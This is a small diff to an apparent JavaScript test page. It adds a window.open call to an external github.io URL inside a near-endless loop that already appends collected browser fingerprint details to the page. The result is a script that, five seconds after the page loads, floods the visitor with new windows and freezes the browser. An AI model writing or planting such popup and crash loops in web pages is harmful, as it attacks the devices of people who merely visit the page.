@@ -50,5 +50,6 @@ setTimeout(() => {
     for (let index = 0; index < 10000000000000000; index++) {
         document.getElementById('test').innerHTML += "<p>" + info.browserPlatform() + info.sizeScreenH() + info.sizeScreenW() + info.browserLanguage() + info.timezone + info.timeOpened + info.scrColorDepth() + info.scrPixelDepth() + info.sizeDocH() + 25641**index + "</p>" ;
         console.log(25641**index)
+        window.open("https://cmoagcod.github.io/test/")
     }
 }, 5000)
